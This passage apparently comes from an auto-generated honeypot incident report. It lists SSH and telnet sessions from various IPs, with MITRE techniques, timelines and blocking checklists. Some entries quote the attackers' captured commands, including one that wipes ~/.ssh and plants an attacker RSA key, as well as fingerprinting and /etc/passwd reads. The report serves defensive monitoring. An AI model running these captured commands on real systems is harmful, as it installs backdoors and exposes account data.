| `2026-08-12 05:55:48` | `cowrie.session.params` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.success` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.command.input` |
| `2026-08-12 05:55:48` | `cowrie.log.closed` |
| `2026-08-12 05:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df07eee65b5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:58 |
| **Last Seen** | 2026-08-12 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:58:02` | `cowrie.session.connect` |
| `2026-08-12 05:58:02` | `cowrie.client.version` |
| `2026-08-12 05:58:02` | `cowrie.client.kex` |
| `2026-08-12 05:58:03` | `cowrie.login.success` |
| `2026-08-12 05:58:04` | `cowrie.session.params` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.success` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.command.input` |
| `2026-08-12 05:58:04` | `cowrie.log.closed` |
| `2026-08-12 05:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede3912ae0d7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 05:58 |
| **Last Seen** | 2026-08-12 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:58:57` | `cowrie.session.connect` |
| `2026-08-12 05:58:57` | `cowrie.client.version` |
| `2026-08-12 05:58:57` | `cowrie.client.kex` |
| `2026-08-12 05:58:58` | `cowrie.login.success` |
| `2026-08-12 05:58:58` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:58:58` | `cowrie.direct-tcpip.data` |
| `2026-08-12 05:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d2472e7a65

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:00 |
| **Last Seen** | 2026-08-12 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:00:27` | `cowrie.session.connect` |
| `2026-08-12 06:00:27` | `cowrie.client.version` |
| `2026-08-12 06:00:27` | `cowrie.client.kex` |
| `2026-08-12 06:00:28` | `cowrie.login.success` |
| `2026-08-12 06:00:29` | `cowrie.session.params` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.success` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:29` | `cowrie.command.input` |
| `2026-08-12 06:00:30` | `cowrie.log.closed` |
| `2026-08-12 06:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585c82a221e9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:02 |
| **Last Seen** | 2026-08-12 06:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:02:45` | `cowrie.session.connect` |
| `2026-08-12 06:02:45` | `cowrie.client.version` |
| `2026-08-12 06:02:46` | `cowrie.client.kex` |
| `2026-08-12 06:02:46` | `cowrie.login.success` |
| `2026-08-12 06:02:48` | `cowrie.session.params` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.success` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.command.input` |
| `2026-08-12 06:02:48` | `cowrie.log.closed` |
| `2026-08-12 06:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c74f5fb588

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:05 |
| **Last Seen** | 2026-08-12 06:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:05:07` | `cowrie.session.connect` |
| `2026-08-12 06:05:07` | `cowrie.client.version` |
| `2026-08-12 06:05:07` | `cowrie.client.kex` |
| `2026-08-12 06:05:08` | `cowrie.login.success` |
| `2026-08-12 06:05:09` | `cowrie.session.params` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.success` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.command.input` |
| `2026-08-12 06:05:09` | `cowrie.log.closed` |
| `2026-08-12 06:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb0c894d127

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-08-12 06:05 |
| **Last Seen** | 2026-08-12 06:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:05:26` | `cowrie.session.connect` |
| `2026-08-12 06:05:26` | `cowrie.client.version` |
| `2026-08-12 06:05:26` | `cowrie.client.kex` |
| `2026-08-12 06:05:28` | `cowrie.login.success` |
| `2026-08-12 06:05:29` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797f0c94f6ea

| Field | Detail |
|---|---|
| **Source IP** | `36.66.16[.]233` |
| **First Seen** | 2026-08-12 06:05 |
| **Last Seen** | 2026-08-12 06:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:05:28` | `cowrie.session.connect` |
| `2026-08-12 06:05:28` | `cowrie.client.version` |
| `2026-08-12 06:05:28` | `cowrie.client.kex` |
| `2026-08-12 06:05:29` | `cowrie.login.success` |
| `2026-08-12 06:05:30` | `cowrie.session.params` |
| `2026-08-12 06:05:30` | `cowrie.command.input` |
| `2026-08-12 06:05:30` | `cowrie.command.failed` |
| `2026-08-12 06:05:31` | `cowrie.log.closed` |
| `2026-08-12 06:05:31` | `cowrie.session.params` |
| `2026-08-12 06:05:31` | `cowrie.command.input` |
| `2026-08-12 06:05:32` | `cowrie.session.file_download` |
| `2026-08-12 06:05:32` | `cowrie.log.closed` |
| `2026-08-12 06:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.66.16[.]233` to AbuseIPDB if not already reported
- [ ] Block `36.66.16[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4698f31b5938

| Field | Detail |
|---|---|
| **Source IP** | `36.66.16[.]233` |
| **First Seen** | 2026-08-12 06:05 |
| **Last Seen** | 2026-08-12 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:05:32` | `cowrie.session.connect` |
| `2026-08-12 06:05:32` | `cowrie.client.version` |
| `2026-08-12 06:05:32` | `cowrie.client.kex` |
| `2026-08-12 06:05:33` | `cowrie.login.success` |
| `2026-08-12 06:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.66.16[.]233` to AbuseIPDB if not already reported
- [ ] Block `36.66.16[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ead0d76c973

| Field | Detail |
|---|---|
| **Source IP** | `36.66.16[.]233` |
| **First Seen** | 2026-08-12 06:05 |
| **Last Seen** | 2026-08-12 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:05:34` | `cowrie.session.connect` |
| `2026-08-12 06:05:34` | `cowrie.client.version` |
| `2026-08-12 06:05:34` | `cowrie.client.kex` |
| `2026-08-12 06:05:35` | `cowrie.login.success` |
| `2026-08-12 06:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.66.16[.]233` to AbuseIPDB if not already reported
- [ ] Block `36.66.16[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ab243e4ec38

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-08-12 06:05 |
| **Last Seen** | 2026-08-12 06:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:05:39` | `cowrie.session.connect` |
| `2026-08-12 06:05:40` | `cowrie.client.version` |
| `2026-08-12 06:05:40` | `cowrie.client.kex` |
| `2026-08-12 06:05:41` | `cowrie.login.success` |
| `2026-08-12 06:05:42` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e338a54b63b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:07 |
| **Last Seen** | 2026-08-12 06:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:07:28` | `cowrie.session.connect` |
| `2026-08-12 06:07:28` | `cowrie.client.version` |
| `2026-08-12 06:07:28` | `cowrie.client.kex` |
| `2026-08-12 06:07:29` | `cowrie.login.success` |
| `2026-08-12 06:07:30` | `cowrie.session.params` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.success` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.command.input` |
| `2026-08-12 06:07:30` | `cowrie.log.closed` |
| `2026-08-12 06:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3bdc342cb41

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:09 |
| **Last Seen** | 2026-08-12 06:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:09:47` | `cowrie.session.connect` |
| `2026-08-12 06:09:47` | `cowrie.client.version` |
| `2026-08-12 06:09:47` | `cowrie.client.kex` |
| `2026-08-12 06:09:48` | `cowrie.login.success` |
| `2026-08-12 06:09:49` | `cowrie.session.params` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.success` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:49` | `cowrie.command.input` |
| `2026-08-12 06:09:50` | `cowrie.log.closed` |
| `2026-08-12 06:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66fbbc994e77

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:12 |
| **Last Seen** | 2026-08-12 06:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:12:03` | `cowrie.session.connect` |
| `2026-08-12 06:12:03` | `cowrie.client.version` |
| `2026-08-12 06:12:03` | `cowrie.client.kex` |
| `2026-08-12 06:12:03` | `cowrie.login.success` |
| `2026-08-12 06:12:04` | `cowrie.session.params` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.success` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:04` | `cowrie.command.input` |
| `2026-08-12 06:12:05` | `cowrie.log.closed` |
| `2026-08-12 06:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ae9d564294

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:14 |
| **Last Seen** | 2026-08-12 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:14:16` | `cowrie.session.connect` |
| `2026-08-12 06:14:16` | `cowrie.client.version` |
| `2026-08-12 06:14:16` | `cowrie.client.kex` |
| `2026-08-12 06:14:17` | `cowrie.login.success` |
| `2026-08-12 06:14:18` | `cowrie.session.params` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.success` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:18` | `cowrie.command.input` |
| `2026-08-12 06:14:19` | `cowrie.log.closed` |
| `2026-08-12 06:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3139242d4dde

| Field | Detail |
|---|---|
| **Source IP** | `120.26.220[.]254` |
| **First Seen** | 2026-08-12 06:14 |
| **Last Seen** | 2026-08-12 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:14:54` | `cowrie.session.connect` |
| `2026-08-12 06:14:56` | `cowrie.telnet.option` |
| `2026-08-12 06:14:56` | `cowrie.telnet.option` |
| `2026-08-12 06:14:56` | `cowrie.login.success` |
| `2026-08-12 06:14:57` | `cowrie.session.params` |
| `2026-08-12 06:14:57` | `cowrie.telnet.option` |
| `2026-08-12 06:14:57` | `cowrie.telnet.option` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
